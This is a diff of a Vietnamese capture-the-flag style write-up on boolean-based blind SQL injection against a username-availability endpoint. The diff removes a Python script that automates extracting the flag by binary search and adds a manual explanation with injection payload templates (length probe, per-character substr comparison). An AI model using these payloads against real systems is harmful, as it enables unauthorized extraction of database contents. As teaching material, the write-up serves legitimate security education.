@@ -60,32 +60,24 @@ Endpoint chỉ trả TAKEN / AVAILABLE — không lộ dữ liệu, không lộ 
 ?username=admin' AND '1'='2     → AVAILABLE
 ```
 
-**Bước 2 — biến đúng/sai thành dấu hiệu bằng `OR`:**
+**Bước 2 — dò độ dài flag qua dấu hiệu đúng/sai bằng `OR`:**
 ```
 ?username=nosuchuser' OR ((SELECT length(flag) FROM flags WHERE code='boolean_blind') >= 10) -- 
 ```
 
-**Bước 3 — dò từng ký tự bằng binary search**, nhận biết TAKEN/AVAILABLE qua class CSS `ms-alert-danger` (xem `exploit.py` để có code đầy đủ):
-```python
-def truthy(cond):
-    payload = f"nosuchuser' OR ({cond}) -- "
-    r = requests.get(URL, params={"username": payload})
-    return "ms-alert-danger" in r.text
-
-def extract_flag():
-    length = next(i-1 for i in range(1,80)
-        if not truthy(f"(SELECT length(flag) FROM flags WHERE code='boolean_blind') >= {i}"))
-    out = ""
-    for i in range(1, length+1):
-        lo, hi = 32, 126
-        while lo < hi:
-            mid = (lo+hi)//2
-            cond = f"(SELECT unicode(substr(flag,{i},1)) FROM flags WHERE code='boolean_blind') > {mid}"
-            lo, hi = (mid+1, hi) if truthy(cond) else (lo, mid)
-        out += chr(lo)
-        print(f"[dò ký tự {i}/{length}] {out}")
-    return out
+**Bước 3 — dò từng ký tự bằng SQL (binary search thủ công)**, nhận biết
+TAKEN/AVAILABLE qua kết quả trả về của mỗi request.
+ 
+Payload chung để kiểm tra 1 ký tự tại 1 vị trí:
 ```
+?username=nosuchuser' OR ((SELECT unicode(substr(flag,<vị_trí>,1)) FROM flags WHERE code='boolean_blind') > <mốc_so_sánh>) -- 
+```
+- TAKEN ⇒ ký tự tại `<vị_trí>` có mã ASCII **lớn hơn** `<mốc_so_sánh>`.
+- AVAILABLE ⇒ ký tự đó **nhỏ hơn hoặc bằng** mốc.
+Cứ đổi `<mốc_so_sánh>` theo kiểu chia đôi khoảng 32–126 (ký tự in được)
+cho đến khi chỉ còn đúng 1 giá trị — đó là mã ASCII của ký tự tại vị trí
+đang dò. Tăng `<vị_trí>` lên 1 (`substr(flag,2,1)`, `substr(flag,3,1)`...)
+để dò tiếp các ký tự sau.
 
 ---
 
